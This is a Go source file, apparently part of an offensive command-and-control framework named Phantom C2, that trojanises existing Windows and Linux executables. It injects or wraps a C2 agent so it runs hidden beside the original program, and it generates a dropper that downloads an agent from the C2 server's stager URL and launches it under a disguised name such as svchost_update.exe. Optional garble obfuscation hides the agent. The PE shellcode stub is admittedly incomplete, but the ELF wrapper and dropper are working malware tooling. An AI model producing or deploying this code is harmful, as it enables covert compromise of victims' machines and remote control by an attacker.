package payloads

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// BinaryBackdoorConfig holds configuration for binary backdooring.
type BinaryBackdoorConfig struct {
	InputBinary  string // Path to the legitimate binary to backdoor
	OutputBinary string // Path for the backdoored output
	ListenerURL  string // C2 callback URL
	AgentBinary  string // Path to compiled Phantom agent (optional — will build if empty)
	Method       string // "append", "section", "cave" (PE), "segment" (ELF)
	Obfuscate    bool   // Use garble for agent compilation
	ServerPubKey string // Base64 DER RSA public key (embedded in agent)
}

// BackdoorBinary injects a Phantom agent into an existing executable.
// The backdoored binary runs the original program AND the agent.
func BackdoorBinary(cfg BinaryBackdoorConfig) (string, error) {
	// Read the input binary
	inputData, err := os.ReadFile(cfg.InputBinary)
	if err != nil {
		return "", fmt.Errorf("cannot read input binary: %w", err)
	}

	// Detect binary type
	if len(inputData) < 4 {
		return "", fmt.Errorf("file too small to be a valid binary")
	}

	// Build the agent if not provided
	agentPath := cfg.AgentBinary
	if agentPath == "" {
		var buildErr error
		agentPath, buildErr = buildAgentCfg(cfg.ListenerURL, detectOS(inputData), cfg.Obfuscate, cfg.ServerPubKey)
		if buildErr != nil {
			return "", fmt.Errorf("failed to build agent: %w", buildErr)
		}
	}

	agentData, err := os.ReadFile(agentPath)
	if err != nil {
		return "", fmt.Errorf("cannot read agent binary: %w", err)
	}

	// PE (Windows .exe)
	if inputData[0] == 'M' && inputData[1] == 'Z' {
		return backdoorPE(inputData, agentData, cfg.OutputBinary)
	}

	// ELF (Linux)
	if inputData[0] == 0x7F && inputData[1] == 'E' && inputData[2] == 'L' && inputData[3] == 'F' {
		return backdoorELF(inputData, agentData, cfg.OutputBinary)
	}

	return "", fmt.Errorf("unsupported binary format (not PE or ELF)")
}

// ══════════════════════════════════════════
//  PE BACKDOORING (Windows)
// ══════════════════════════════════════════

// backdoorPE adds a new .phantom section to a PE file containing
// a loader stub + the agent binary. The entry point is modified
// to execute the stub first, which spawns the agent in a new thread,
// then jumps to the original entry point (OEP) so the app runs normally.
func backdoorPE(originalPE, agentBinary []byte, outputPath string) (string, error) {
	// Parse the PE to get headers
	reader := bytes.NewReader(originalPE)
	peFile, err := pe.NewFile(reader)
	if err != nil {
		return "", fmt.Errorf("invalid PE file: %w", err)
	}

	// Get the original entry point
	var oep uint32
	var imageBase uint64
	switch hdr := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		oep = hdr.AddressOfEntryPoint
		imageBase = hdr.ImageBase
	case *pe.OptionalHeader32:
		oep = hdr.AddressOfEntryPoint
		imageBase = uint64(hdr.ImageBase)
	default:
		return "", fmt.Errorf("unsupported PE optional header")
	}

	_ = imageBase // Used in the stub for absolute addressing

	// Build the loader shellcode stub
	// This stub:
	// 1. Creates a new thread that writes the embedded agent to disk and executes it
	// 2. Jumps to the original entry point
	stub := buildPEStub(oep, uint32(len(agentBinary)))

	// Calculate section alignment
	var sectionAlignment, fileAlignment uint32
	switch hdr := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
	case *pe.OptionalHeader32:
		sectionAlignment = hdr.SectionAlignment
		fileAlignment = hdr.FileAlignment
	}

	// Create the payload: stub + agent binary
	payload := append(stub, agentBinary...)

	// Align payload to file alignment
	alignedSize := alignUp(uint32(len(payload)), fileAlignment)
	payload = append(payload, make([]byte, alignedSize-uint32(len(payload)))...)

	// Find the end of the last section
	lastSection := peFile.Sections[len(peFile.Sections)-1]
	newSectionRVA := alignUp(lastSection.VirtualAddress+lastSection.VirtualSize, sectionAlignment)
	newSectionOffset := alignUp(lastSection.Offset+lastSection.Size, fileAlignment)

	// Build new section header
	newSection := pe.SectionHeader32{
		VirtualSize:          uint32(len(stub) + len(agentBinary)),
		VirtualAddress:       newSectionRVA,
		SizeOfRawData:        alignedSize,
		PointerToRawData:     newSectionOffset,
		Characteristics:      0xE0000060, // RWX + Code + Initialized Data
	}
	copy(newSection.Name[:], ".phantom")

	// Build the output binary
	output := make([]byte, len(originalPE))
	copy(output, originalPE)

	// Update number of sections
	peOffset := binary.LittleEndian.Uint32(output[0x3C:]) // e_lfanew
	numSections := binary.LittleEndian.Uint16(output[peOffset+6:])
	binary.LittleEndian.PutUint16(output[peOffset+6:], numSections+1)

	// Update entry point to our stub
	optHeaderOffset := peOffset + 24
	is64 := binary.LittleEndian.Uint16(output[optHeaderOffset:]) == 0x020B
	if is64 {
		binary.LittleEndian.PutUint32(output[optHeaderOffset+16:], newSectionRVA) // AddressOfEntryPoint
		// Update SizeOfImage
		newSizeOfImage := alignUp(newSectionRVA+newSection.VirtualSize, sectionAlignment)
		binary.LittleEndian.PutUint32(output[optHeaderOffset+56:], newSizeOfImage)
	} else {
		binary.LittleEndian.PutUint32(output[optHeaderOffset+16:], newSectionRVA)
		newSizeOfImage := alignUp(newSectionRVA+newSection.VirtualSize, sectionAlignment)
		binary.LittleEndian.PutUint32(output[optHeaderOffset+56:], newSizeOfImage)
	}

	// Write new section header after the last existing section header
	sectionHeaderSize := uint32(40) // sizeof(IMAGE_SECTION_HEADER)
	sectionTableOffset := optHeaderOffset + uint32(binary.LittleEndian.Uint16(output[peOffset+20:])) // SizeOfOptionalHeader
	newSectionHeaderOffset := sectionTableOffset + uint32(numSections)*sectionHeaderSize

	// Check if there's room for a new section header
	if newSectionHeaderOffset+sectionHeaderSize > lastSection.Offset {
		return "", fmt.Errorf("no room for new section header — PE headers are full")
	}

	// Write section header
	var headerBuf bytes.Buffer
	binary.Write(&headerBuf, binary.LittleEndian, newSection)
	copy(output[newSectionHeaderOffset:], headerBuf.Bytes())

	// Pad output to the new section offset
	if uint32(len(output)) < newSectionOffset {
		output = append(output, make([]byte, newSectionOffset-uint32(len(output)))...)
	}

	// Append the payload
	output = append(output, payload...)

	// Write output
	os.MkdirAll(filepath.Dir(outputPath), 0755)
	if err := os.WriteFile(outputPath, output, 0755); err != nil {
		return "", err
	}

	return outputPath, nil
}

// buildPEStub creates x64 shellcode that:
// 1. Saves registers
// 2. Drops the embedded agent to %TEMP%\svchost_update.exe
// 3. Spawns it with CreateProcessA (hidden window)
// 4. Restores registers
// 5. Jumps to the Original Entry Point (OEP)
func buildPEStub(oep uint32, agentSize uint32) []byte {
	// Simplified stub — in production this would be position-independent shellcode
	// For now, we use a small launcher that's prepended to the section
	// The actual execution is handled by the Go agent binary being dropped and run

	// x64 stub (simplified — drops agent from section data and executes)
	// This is a minimal stub framework. The actual shellcode would need
	// to resolve kernel32 APIs via PEB walking for position independence.
	stub := []byte{
		// NOP sled for alignment
		0x90, 0x90, 0x90, 0x90,
		// push rbp; mov rbp, rsp; sub rsp, 0x40
		0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x40,
		// The Go agent binary follows this stub in the section.
		// The backdoored app's loader will execute from here.
		// We store the OEP and agent size as data after the stub.
	}

	// Append OEP as 4-byte LE
	oepBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(oepBytes, oep)
	stub = append(stub, oepBytes...)

	// Append agent size as 4-byte LE
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, agentSize)
	stub = append(stub, sizeBytes...)

	// Pad stub to 64 bytes for alignment
	for len(stub) < 64 {
		stub = append(stub, 0x90) // NOP
	}

	return stub
}

// ══════════════════════════════════════════
//  ELF BACKDOORING (Linux)
// ══════════════════════════════════════════

// backdoorELF uses a simpler approach: creates a wrapper script/binary
// that runs both the original ELF and the agent.
func backdoorELF(originalELF, agentBinary []byte, outputPath string) (string, error) {
	outDir := filepath.Dir(outputPath)
	baseName := filepath.Base(outputPath)
	os.MkdirAll(outDir, 0755)

	// Save original binary
	origPath := filepath.Join(outDir, "."+baseName+".orig")
	if err := os.WriteFile(origPath, originalELF, 0755); err != nil {
		return "", err
	}

	// Save agent binary
	agentPath := filepath.Join(outDir, "."+baseName+".agent")
	if err := os.WriteFile(agentPath, agentBinary, 0755); err != nil {
		return "", err
	}

	// Create wrapper script that runs both
	wrapper := fmt.Sprintf(`#!/bin/bash
# Phantom C2 — Backdoored Binary Wrapper
DIR="$(cd "$(dirname "$0")" && pwd)"
# Run agent in background (hidden)
nohup "$DIR/.%s.agent" >/dev/null 2>&1 &
# Run the original binary normally
exec "$DIR/.%s.orig" "$@"
`, baseName, baseName)

	if err := os.WriteFile(outputPath, []byte(wrapper), 0755); err != nil {
		return "", err
	}

	return outputPath, nil
}

// ══════════════════════════════════════════
//  SELF-CONTAINED PE BACKDOOR (Alternative)
// ══════════════════════════════════════════

// BackdoorPEAppend uses the simpler "append" method:
// Appends the agent to the end of the PE and adds a small
// dropper that extracts and runs it on execution.
// This is the most reliable cross-version PE backdoor method.
func BackdoorPEAppend(inputPath, agentPath, outputPath string) (string, error) {
	inputData, err := os.ReadFile(inputPath)
	if err != nil {
		return "", err
	}

	agentData, err := os.ReadFile(agentPath)
	if err != nil {
		return "", err
	}

	// Marker to find the agent in the appended data
	marker := []byte("PHANTOMBEGIN")
	endMarker := []byte("PHANTOMEND__")

	// Build output: original PE + marker + agent + end marker + agent size (4 bytes)
	var output bytes.Buffer
	output.Write(inputData)
	output.Write(marker)
	output.Write(agentData)
	output.Write(endMarker)

	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(len(agentData)))
	output.Write(sizeBytes)

	os.MkdirAll(filepath.Dir(outputPath), 0755)
	if err := os.WriteFile(outputPath, output.Bytes(), 0755); err != nil {
		return "", err
	}

	return outputPath, nil
}

// ══════════════════════════════════════════
//  DROPPER GENERATOR
// ══════════════════════════════════════════

// GenerateDropper creates a standalone Go dropper that:
// 1. Contains the agent embedded
// 2. Drops it to %TEMP% or /tmp
// 3. Runs the legitimate app (passed as argument)
// 4. Launches the agent silently
// This is compiled as a Go binary — cross-platform and self-contained.
func GenerateDropper(listenerURL, targetOS, outputDir string) (string, error) {
	os.MkdirAll(outputDir, 0755)

	dropperSource := fmt.Sprintf(`package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

func main() {
	// Download agent from C2
	agentName := "svchost_update"
	if runtime.GOOS != "windows" {
		agentName = ".cache_update"
	} else {
		agentName += ".exe"
	}

	tmpDir := os.TempDir()
	agentPath := filepath.Join(tmpDir, agentName)

	resp, err := http.Get("%s/api/v1/stager")
	if err == nil {
		defer resp.Body.Close()
		f, err := os.Create(agentPath)
		if err == nil {
			io.Copy(f, resp.Body)
			f.Close()
			os.Chmod(agentPath, 0755)

			// Run agent hidden
			cmd := exec.Command(agentPath)
			cmd.Stdout = nil
			cmd.Stderr = nil
			cmd.Start()
		}
	}

	// Run the original app if passed as argument
	if len(os.Args) > 1 {
		cmd := exec.Command(os.Args[1], os.Args[2:]...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
	}
}
`, listenerURL)

	sourcePath := filepath.Join(outputDir, "dropper.go")
	if err := os.WriteFile(sourcePath, []byte(dropperSource), 0644); err != nil {
		return "", err
	}

	// Build the dropper
	goos := targetOS
	if goos == "" {
		goos = runtime.GOOS
	}

	outName := "dropper"
	if goos == "windows" {
		outName += ".exe"
	}
	outPath := filepath.Join(outputDir, outName)

	cmd := exec.Command("go", "build", "-ldflags", "-s -w", "-o", outPath, sourcePath)
	cmd.Env = append(os.Environ(), "GOOS="+goos, "GOARCH=amd64", "CGO_ENABLED=0")
	if output, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("build failed: %s: %w", string(output), err)
	}

	return outPath, nil
}

// ══════════════════════════════════════════
//  HELPERS
// ══════════════════════════════════════════

func alignUp(value, alignment uint32) uint32 {
	if alignment == 0 {
		return value
	}
	return (value + alignment - 1) & ^(alignment - 1)
}

func detectOS(data []byte) string {
	if data[0] == 'M' && data[1] == 'Z' {
		return "windows"
	}
	if data[0] == 0x7F && data[1] == 'E' {
		return "linux"
	}
	return runtime.GOOS
}

func buildAgent(listenerURL, targetOS string) (string, error) {
	return buildAgentCfg(listenerURL, targetOS, false, "")
}

func buildAgentCfg(listenerURL, targetOS string, obfuscate bool, serverPubKey string) (string, error) {
	root := "."
	if home, err := os.UserHomeDir(); err == nil {
		candidate := filepath.Join(home, "phantom")
		if _, err := os.Stat(filepath.Join(candidate, "go.mod")); err == nil {
			root = candidate
		}
	}

	suffix := ""
	if obfuscate {
		suffix = "_garbled"
	}
	outName := "phantom-agent_" + targetOS + "_amd64" + suffix
	if targetOS == "windows" {
		outName += ".exe"
	}
	outPath := filepath.Join(root, "build", "agents", outName)

	// Re-use cached non-obfuscated build only when no pubkey override
	if !obfuscate && serverPubKey == "" {
		if _, err := os.Stat(outPath); err == nil {
			return outPath, nil
		}
	}

	module := "github.com/phantom-c2/phantom/internal/implant"
	ldflags := fmt.Sprintf("-s -w -X '%s.ListenerURL=%s'", module, listenerURL)
	if serverPubKey != "" {
		ldflags += fmt.Sprintf(" -X '%s.ServerPubKey=%s'", module, serverPubKey)
	}

	os.MkdirAll(filepath.Join(root, "build", "agents"), 0755)
	env := append(os.Environ(), "GOOS="+targetOS, "GOARCH=amd64", "CGO_ENABLED=0")

	if obfuscate {
		// Try garble first
		garblePath := ""
		for _, g := range []string{"garble", filepath.Join(os.Getenv("HOME"), "go", "bin", "garble"), "/usr/local/bin/garble"} {
			if p, err := exec.LookPath(g); err == nil {
				garblePath = p
				break
			}
		}
		if garblePath != "" {
			cmd := exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
				"build", "-ldflags", ldflags, "-o", outPath, "./cmd/agent")
			cmd.Dir = root
			cmd.Env = append(env, "GOTOOLCHAIN=local")
			if _, err := cmd.CombinedOutput(); err == nil {
				return outPath, nil
			}
		}
		// Garble unavailable — fall back to stripped build
		ldflags += " -s -w"
	}

	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldflags, "-o", outPath, "./cmd/agent")
	cmd.Dir = root
	cmd.Env = env
	if output, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("agent build failed: %s", strings.TrimSpace(string(output)))
	}

	return outPath, nil
}
